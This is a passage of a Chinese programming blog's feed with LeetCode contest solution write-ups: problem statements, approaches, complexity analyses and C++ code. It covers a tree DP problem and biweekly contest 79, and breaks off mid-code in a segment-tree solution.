<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-312/problems/number-of-good-paths/">https://leetcode.cn/contest/weekly-contest-312/problems/number-of-good-paths/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p>动态规划</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>设 $dp[node][0], dp[node][1], dp[node][2]$ 分别表示节点 $node$ 构成的子树全部可以获得补给的最小数量：</li>
</ol>
<ul>
<li>$dp[node][0]$ 表示 $node$ 会被父节点补给的最少数量；</li>
<li>$dp[node][1]$ 表示 $node$ 会被其孩子节点补给的最少数量；</li>
<li>$dp[node][2]$ 表示 $node$ 会被自身补给的最少数量；</li>
</ul>
<p>则我们可以知道有以下推论：</p>
<ul>
<li><p>如果 $node$ 会被父节点补给，则此时 $node$ 的子节点此时要么被自身补给，要么被 $node$ 的子节点的子节点补给，且此时 $node$ 子节点不能被 $node$ 补给；所以可以得到以下推论:<br>$$<br>dp[node][0] &#x3D; \min(dp[node.left][1],dp[node.left][2]) + \min(dp[node.right][1],dp[node.right][2])<br>$$<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210071606141.png"></p>
</li>
<li><p>如果 $node$ 会被孩子节点补给，则此时 $node$ 的子节点中一定有一个子节点被自身补给，$node$ 的左孩子要么为补给站要么右孩子为补给站，即两个孩子节点中至少有一个为补给站，所以可以得到以下推论:<br>$$<br>dp[node][1] &#x3D; \min((dp[node.left][1] + \min(dp[node.right][1], dp[node.right][2]), (dp[node.right][1] + \min(dp[node.left][1], dp[node.left][2]))<br>$$<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210072345234.png"></p>
</li>
<li><p>如果 $node$ 会被自身补给，则此时 $node$ 的子节点可以被 $node$ 补给或者被自身、孩子节点补给，此时需要在 $node$ 处放置一个补给站，所以可以得到以下推论:<br>$$<br>dp[node][2] &#x3D; 1 + \min(dp[node.left][0],dp[node.left][1], dp[node.left][2]) + \min(dp[node.left][0],dp[node.left][1], dp[node.left][2])<br>$$<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210072346579.png"></p>
</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(m \log m + n \times \alpha(n))$，其中 $m$ 表示边的数目，$n$ 表示节点的数目。</li>
<li>空间复杂度：$O(n)$，$n$ 表示节点的数目。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/* [a, b, c], a : chose by father, b : chose by child, c : chose by self */</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minSupplyStationNumber</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        function&lt;tuple&lt;<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>&gt;(TreeNode *)&gt; dfs = [&amp;](TreeNode* root)-&gt;tuple&lt;<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">auto</span> [la, lb, lc] = <span class="built_in">dfs</span>(root-&gt;left);</span><br><span class="line">            <span class="keyword">auto</span> [ra, rb, rc] = <span class="built_in">dfs</span>(root-&gt;right);</span><br><span class="line">            <span class="type">int</span> a = <span class="built_in">min</span>(lb, lc) + <span class="built_in">min</span>(rb, rc);</span><br><span class="line">            <span class="type">int</span> b = <span class="built_in">min</span>(lc + <span class="built_in">min</span>(rb, rc), rc + <span class="built_in">min</span>(lb, lc));</span><br><span class="line">            <span class="type">int</span> c = <span class="number">1</span> + <span class="built_in">min</span>(&#123;la, lb, lc&#125;) + <span class="built_in">min</span>(&#123;ra, rb, rc&#125;);</span><br><span class="line">            <span class="keyword">return</span> &#123;a, b, c&#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">auto</span> [a, b, c] = <span class="built_in">dfs</span>(root);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span>(b, c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode biweekly contest 79</title>
    <url>/2022/01/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/4/</url>
    <content><![CDATA[<h2 id="leetcode-biweekly-contest-79"><a href="#leetcode-biweekly-contest-79" class="headerlink" title="leetcode biweekly contest 79"></a>leetcode biweekly contest 79</h2><p>最近几次的双周赛最后一题都比较难，感觉双周赛的题目质量明显好于周赛质量，当然毕竟只是面试题目，感觉模板化很严重。</p>
<h3 id="2283-判断一个数的数字计数是否等于数位的值"><a href="#2283-判断一个数的数字计数是否等于数位的值" class="headerlink" title="2283. 判断一个数的数字计数是否等于数位的值"></a>2283. 判断一个数的数字计数是否等于数位的值</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始长度为 <code>n</code> 的字符串 <code>num</code> ，它只包含数字。</p>
<p>如果对于 每个 <code>0 &lt;= i &lt; n</code> 的下标 <code>i</code> ，都满足数位 <code>i</code> 在 <code>num</code> 中出现了 <code>num[i]</code> 次，那么请你返回 <code>true</code> ，否则返回 <code>false</code> 。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：num = &quot;1210&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：</span><br><span class="line">num[0] = &#x27;1&#x27; 。数字 0 在 num 中出现了一次。</span><br><span class="line">num[1] = &#x27;2&#x27; 。数字 1 在 num 中出现了两次。</span><br><span class="line">num[2] = &#x27;1&#x27; 。数字 2 在 num 中出现了一次。</span><br><span class="line">num[3] = &#x27;0&#x27; 。数字 3 在 num 中出现了零次。</span><br><span class="line">&quot;1210&quot; 满足题目要求条件，所以返回 true 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：num = &quot;030&quot;</span><br><span class="line">输出：false</span><br><span class="line">解释：</span><br><span class="line">num[0] = &#x27;0&#x27; 。数字 0 应该出现 0 次，但是在 num 中出现了一次。</span><br><span class="line">num[1] = &#x27;3&#x27; 。数字 1 应该出现 3 次，但是在 num 中出现了零次。</span><br><span class="line">num[2] = &#x27;0&#x27; 。数字 2 在 num 中出现了 0 次。</span><br><span class="line">下标 0 和 1 都违反了题目要求，所以返回 false 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == num.length</code></li>
<li><code>1 &lt;= n &lt;= 10</code></li>
<li><code>num</code> 只包含数字。</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/check-if-number-has-equal-digit-count-and-digit-value/">https://leetcode.cn/problems/check-if-number-has-equal-digit-count-and-digit-value/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历即可
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接统计字符出现次数即可，然后依次遍历即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$, 其中 $n$ 为数组的长度。</li>
<li>空间复杂度：$O(\Sigma)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">digitCount</span><span class="params">(string num)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cnt</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c : num) &#123;</span><br><span class="line">            cnt[c - <span class="string">&#x27;0&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="type">int</span> x = num[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (x != cnt[i]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2284-最多单词数的发件人"><a href="#2284-最多单词数的发件人" class="headerlink" title="2284. 最多单词数的发件人"></a>2284. 最多单词数的发件人</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个聊天记录，共包含 n 条信息。给你两个字符串数组 <code>messages</code> 和 <code>senders</code> ，其中 <code>messages[i]</code> 是 <code>senders[i]</code> 发出的一条 信息 。</p>
<p>一条 信息 是若干用单个空格连接的 单词 ，信息开头和结尾不会有多余空格。发件人的 单词计数 是这个发件人总共发出的 单词数 。注意，一个发件人可能会发出多于一条信息。</p>
<p>请你返回发出单词数 最多 的发件人名字。如果有多个发件人发出最多单词数，请你返回 字典序 最大的名字。</p>
<p>注意：</p>
<ul>
<li>字典序里，大写字母小于小写字母。</li>
<li><code>&quot;Alice&quot;</code> 和 <code>&quot;alice&quot;</code> 是不同的名字。</li>
</ul>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：messages = [&quot;Hello userTwooo&quot;,&quot;Hi userThree&quot;,&quot;Wonderful day Alice&quot;,&quot;Nice day userThree&quot;], senders = [&quot;Alice&quot;,&quot;userTwo&quot;,&quot;userThree&quot;,&quot;Alice&quot;]</span><br><span class="line">输出：&quot;Alice&quot;</span><br><span class="line">解释：Alice 总共发出了 2 + 3 = 5 个单词。</span><br><span class="line">userTwo 发出了 2 个单词。</span><br><span class="line">userThree 发出了 3 个单词。</span><br><span class="line">由于 Alice 发出单词数最多，所以我们返回 &quot;Alice&quot; 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：messages = [&quot;How is leetcode for everyone&quot;,&quot;Leetcode is useful for practice&quot;], senders = [&quot;Bob&quot;,&quot;Charlie&quot;]</span><br><span class="line">输出：&quot;Charlie&quot;</span><br><span class="line">解释：Bob 总共发出了 5 个单词。</span><br><span class="line">Charlie 总共发出了 5 个单词。</span><br><span class="line">由于最多单词数打平，返回字典序最大的名字，也就是 Charlie 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == messages.length == senders.length</code></li>
<li><code>1 &lt;= n &lt;= 104</code></li>
<li><code>1 &lt;= messages[i].length &lt;= 100</code></li>
<li><code>1 &lt;= senders[i].length &lt;= 10</code></li>
<li><code>messages[i]</code> 包含大写字母、小写字母和 ‘ ‘ 。</li>
<li><code>messages[i]</code> 中所有单词都由 单个空格 隔开。</li>
<li><code>messages[i]</code> 不包含前导和后缀空格。</li>
<li><code>senders[i]</code> 只包含大写英文字母和小写英文字母。</li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/sender-with-largest-word-count">https://leetcode.cn/problems/sender-with-largest-word-count</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>hash统计
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接 $hash$ 统计出每个发件人发送的单词数目即可，然后找到最大值即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 为字符串的长度。</li>
<li>空间复杂度：$O(n)$, 其中 $n$ 为字符串的长度。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">split</span><span class="params">(<span class="type">const</span> string &amp; word)</span> </span>&#123;</span><br><span class="line">        vector&lt;string&gt; res;</span><br><span class="line">        <span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (pos &lt; word.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">while</span> (pos &lt; word.<span class="built_in">size</span>() &amp;&amp; word[pos] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                pos++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> curr = pos;</span><br><span class="line">            <span class="keyword">while</span> (pos &lt; word.<span class="built_in">size</span>() &amp;&amp; word[pos] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                pos++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (curr &lt; word.<span class="built_in">size</span>()) &#123;</span><br><span class="line">                res.<span class="built_in">emplace_back</span>(word.<span class="built_in">substr</span>(curr, pos - curr));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">string <span class="title">largestWordCount</span><span class="params">(vector&lt;string&gt;&amp; messages, vector&lt;string&gt;&amp; senders)</span> </span>&#123;</span><br><span class="line">        string res;</span><br><span class="line">        <span class="type">int</span> maxVal = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = messages.<span class="built_in">size</span>();</span><br><span class="line">        unordered_map&lt;string, <span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            vector&lt;string&gt; words = <span class="built_in">split</span>(messages[i]);</span><br><span class="line">            cnt[senders[i]] += words.<span class="built_in">size</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp; [name, freq] : cnt) &#123;</span><br><span class="line">            <span class="keyword">if</span> (freq &gt; maxVal) &#123;</span><br><span class="line">                maxVal = freq;</span><br><span class="line">                res = name;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (freq == maxVal &amp;&amp; name &gt; res) &#123;</span><br><span class="line">                res = name;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2285-道路的最大总重要性"><a href="#2285-道路的最大总重要性" class="headerlink" title="2285. 道路的最大总重要性"></a>2285. 道路的最大总重要性</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个整数 <code>n</code>，表示一个国家里的城市数目。城市编号为 <code>0</code> 到 <code>n - 1</code>。</p>
<p>给你一个二维整数数组 <code>roads</code> ，其中 <code>roads[i] = [ai, bi]</code> 表示城市 <code>ai</code> 和<code> bi</code> 之间有一条 双向 道路。</p>
<p>你需要给每个城市安排一个从 <code>1</code> 到 <code>n</code> 之间的整数值，且每个值只能被使用 一次 。道路的 重要性 定义为这条道路连接的两座城市数值 之和 。</p>
<p>请你返回在最优安排下，所有道路重要性 之和 最大 为多少。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 5, roads = [[0,1],[1,2],[2,3],[0,2],[1,3],[2,4]]</span><br><span class="line">输出：43</span><br><span class="line">解释：上图展示了国家图和每个城市被安排的值 [2,4,5,3,1] 。</span><br><span class="line">- 道路 (0,1) 重要性为 2 + 4 = 6 。</span><br><span class="line">- 道路 (1,2) 重要性为 4 + 5 = 9 。</span><br><span class="line">- 道路 (2,3) 重要性为 5 + 3 = 8 。</span><br><span class="line">- 道路 (0,2) 重要性为 2 + 5 = 7 。</span><br><span class="line">- 道路 (1,3) 重要性为 4 + 3 = 7 。</span><br><span class="line">- 道路 (2,4) 重要性为 5 + 1 = 6 。</span><br><span class="line">所有道路重要性之和为 6 + 9 + 8 + 7 + 7 + 6 = 43 。</span><br><span class="line">可以证明，重要性之和不可能超过 43 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 5, roads = [[0,3],[2,4],[1,3]]</span><br><span class="line">输出：20</span><br><span class="line">解释：上图展示了国家图和每个城市被安排的值 [4,3,2,5,1] 。</span><br><span class="line">- 道路 (0,3) 重要性为 4 + 5 = 9 。</span><br><span class="line">- 道路 (2,4) 重要性为 2 + 1 = 3 。</span><br><span class="line">- 道路 (1,3) 重要性为 3 + 5 = 8 。</span><br><span class="line">所有道路重要性之和为 9 + 3 + 8 = 20 。</span><br><span class="line">可以证明，重要性之和不可能超过 20 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>2 &lt;= n &lt;= 5 * 104</code></li>
<li><code>1 &lt;= roads.length &lt;= 5 * 104</code></li>
<li><code>roads[i].length == 2</code></li>
<li><code>0 &lt;= ai, bi &lt;= n - 1</code></li>
<li><code>ai != bi</code><br>没有重复道路。</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/maximum-total-importance-of-roads">https://leetcode.cn/problems/maximum-total-importance-of-roads</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>贪心算法
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>这个题目感觉就是简单题目了，设每个节点 $i$ 的度为 $i$ 则我们可以知道道路重要性之和为 $\sum_{i&#x3D;0}^{n-1}(i \times degree[i])$，所以我们优先将最大的编号分配给度最大的节点即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n)$, 其中 $n$ 为节点的数目。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 为节点的数目。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">maximumImportance</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; roads)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">degree</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; roads.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="type">int</span> x = roads[i][<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> y = roads[i][<span class="number">1</span>];</span><br><span class="line">            degree[x]++;</span><br><span class="line">            degree[y]++;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt; arr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            arr.<span class="built_in">emplace_back</span>(degree[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(arr.<span class="built_in">begin</span>(), arr.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            res += (<span class="type">long</span> <span class="type">long</span>) (i + <span class="number">1</span>) * arr[i].first;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2286-以组为单位订音乐会的门票"><a href="#2286-以组为单位订音乐会的门票" class="headerlink" title="2286. 以组为单位订音乐会的门票"></a>2286. 以组为单位订音乐会的门票</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>一个音乐会总共有 <code>n</code> 排座位，编号从 <code>0</code> 到 <code>n - 1</code> ，每一排有 <code>m</code>个座椅，编号为 <code>0</code> 到 <code>m - 1</code> 。你需要设计一个买票系统，针对以下情况进行座位安排：</p>
<ul>
<li><p>同一组的 <code>k</code> 位观众坐在 同一排座位，且座位连续 。</p>
</li>
<li><p><code>k</code> 位观众中 每一位 都有座位坐，但他们 不一定 坐在一起。<br>由于观众非常挑剔，所以：</p>
</li>
<li><p>只有当一个组里所有成员座位的排数都 小于等于 <code>maxRow</code> ，这个组才能订座位。每一组的 <code>maxRow</code> 可能 不同 。</p>
</li>
<li><p>如果有多排座位可以选择，优先选择 最小 的排数。如果同一排中有多个座位可以坐，优先选择号码 最小 的。<br>请你实现<code> BookMyShow</code> 类：</p>
</li>
<li><p><code>BookMyShow(int n, int m)</code> ，初始化对象，n 是排数，m 是每一排的座位数。</p>
</li>
<li><p><code>int[] gather(int k, int maxRow)</code> 返回长度为 2 的数组，表示 k 个成员中 第一个座位 的排数和座位编号，这 k 位成员必须坐在 同一排座位，且座位连续 。换言之，返回最小可能的 r 和 c 满足第 r 排中 [c, c + k - 1] 的座位都是空的，且 r &lt;&#x3D; maxRow 。如果 无法 安排座位，返回 [] 。</p>
</li>
<li><p><code>boolean scatter(int k, int maxRow)</code> 如果组里所有 k 个成员 不一定 要坐在一起的前提下，都能在第 0 排到第 maxRow 排之间找到座位，那么请返回 true 。这种情况下，每个成员都优先找排数 最小 ，然后是座位编号最小的座位。如果不能安排所有 k 个成员的座位，请返回 false 。</p>
</li>
</ul>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">[&quot;BookMyShow&quot;, &quot;gather&quot;, &quot;gather&quot;, &quot;scatter&quot;, &quot;scatter&quot;]</span><br><span class="line">[[2, 5], [4, 0], [2, 0], [5, 1], [5, 1]]</span><br><span class="line">输出：</span><br><span class="line">[null, [0, 0], [], true, false]</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">BookMyShow bms = new BookMyShow(2, 5); // 总共有 2 排，每排 5 个座位。</span><br><span class="line">bms.gather(4, 0); // 返回 [0, 0]</span><br><span class="line">                  // 这一组安排第 0 排 [0, 3] 的座位。</span><br><span class="line">bms.gather(2, 0); // 返回 []</span><br><span class="line">                  // 第 0 排只剩下 1 个座位。</span><br><span class="line">                  // 所以无法安排 2 个连续座位。</span><br><span class="line">bms.scatter(5, 1); // 返回 True</span><br><span class="line">                   // 这一组安排第 0 排第 4 个座位和第 1 排 [0, 3] 的座位。</span><br><span class="line">bms.scatter(5, 1); // 返回 False</span><br><span class="line">                   // 总共只剩下 2 个座位。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= n &lt;= 5 * 104</code></li>
<li><code>1 &lt;= m, k &lt;= 109</code></li>
<li><code>0 &lt;= maxRow &lt;= n - 1</code></li>
<li><code>gather</code> 和 <code>scatter</code> 总 调用次数不超过 <code>5 * 104</code> 次。</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/booking-concert-tickets-in-groups">https://leetcode.cn/problems/booking-concert-tickets-in-groups</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>二分查找 + 线段树
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>这个题目确实超纲了，当然也是第一次见到线段树上二分的情况，还是非常不错的题目，线段树上二分这个方法确实太棒了，有许多地方都可以应用这个动态更新和变换的解法。当然题目中最关键的一点需要明白，对于每一排作为，不管如何选择，每一排的座位中一定是前半部分是坐满的，后半部分是全空的，因为题目要求不管是 <code>gather</code> 还是 <code>scatter</code> 操作每次都是贪心的从每一排的最左边的空位置开始的，所以这样一定保证每一排的座位被分成两部分, 前 $i$ 个座位上一定坐满了人，$i+1$ 以后的座位全部是空的。</li>
<li>可以参考<a href="https://leetcode.cn/problems/booking-concert-tickets-in-groups/solution/by-endlesscheng-okcu/">题解</a>, 所以我们可以设线段树，设区间 $[l,r]$, 我们用 $tsum[l,r]$ 记录区间从 $i$ 排到 $j$ 排的座位空座位数目，$tmin[l,r]$ 记录区间从 $i$ 排到 $j$ 的空座位的最小起点，对于前缀和的 $sum$ 操作很简单，难点在于线段树上的二分：</li>
</ol>
<ul>
<li>用线段树维护每个区间上的空座位的起点最小值 $ \textit{tmin}$<ul>
<li>如果当前区间 $\textit{tmin} &gt; m−k $，则此时剩余的座位数位 $m - \textit{tmin} &lt; k$, 肯定无法满足坐满连续的 $k$ 个人；</li>
<li>如果当前区间只包含一个元素，则返回该元素的下标；</li>
<li>如果左半部分 $\textit{tmin} \le m−k$，说明左区间存在可以连续坐满 $k$ 个人的空座位的排，递归左半部分；</li>
<li>否则如果 $\textit{maxRow}$ 在右半部分内，则递归右半部分；</li>
<li>否则返回 $0$。<br>确实非常桥面的线段上二分的解法。</li>
</ul>
</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$\text{gather}$ 的时间复杂度为 $O(\log n)$, 其中 $n$ 为排数，$\text{scatter}$ 的时间复杂度为 $O((n + q)\log n)$。</li>
<li>空间复杂度：$O(n)$, 其中 $n$ 为排数。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CHL(x) (2 * (x))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHR(x) (2 * (x) + 1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BookMyShow</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">BookMyShow</span>(<span class="type">int</span> n, <span class="type">int</span> m) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;row = n;</span><br><span class="line">        <span class="keyword">this</span>-&gt;col = m;</span><br><span class="line">        <span class="keyword">this</span>-&gt;tsum = <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(n * <span class="number">4</span> + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">this</span>-&gt;tmin = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n * <span class="number">4</span> + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">build</span>(<span class="number">0</span>, n - <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">gather</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> maxRow)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="built_in">queryIndex</span>(col - k, maxRow, <span class="number">0</span>, row - <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> curr = col - <span class="built_in">querySum</span>(i, i, <span class="number">0</span>, row - <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res = &#123;i, curr&#125;;</span><br><span class="line">        <span class="built_in">update</span>(i, k, <span class="number">0</span>, row - <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">scatter</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> maxRow)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> sum = <span class="built_in">querySum</span>(<span class="number">0</span>, maxRow, <span class="number">0</span>, row - 